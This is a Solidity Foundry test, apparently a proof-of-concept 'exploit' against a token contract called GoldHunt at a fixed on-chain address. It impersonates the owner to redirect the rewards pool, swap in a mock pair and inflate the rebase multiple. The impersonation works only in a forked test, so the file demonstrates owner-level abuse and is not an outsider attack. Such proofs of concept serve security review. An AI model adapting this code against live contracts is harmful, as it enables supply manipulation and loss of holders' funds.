// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GoldHunt {
    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function setPair(address _pair) external;
    function rebase(uint multiple) external;
    function rebaseMultiple() external view returns (uint);
}

contract MockPair {
    function sync() external {}
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);
    GoldHunt target;
    address owner;
    MockPair mockPair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = GoldHunt(TARGET);
        owner = target.owner();
        mockPair = new MockPair();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        target.setRewardsPool(address(this));
        target.setPair(address(mockPair));
        target.rebase(10e30);
        vm.stopPrank();
        assertGt(target.rebaseMultiple(), 1, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
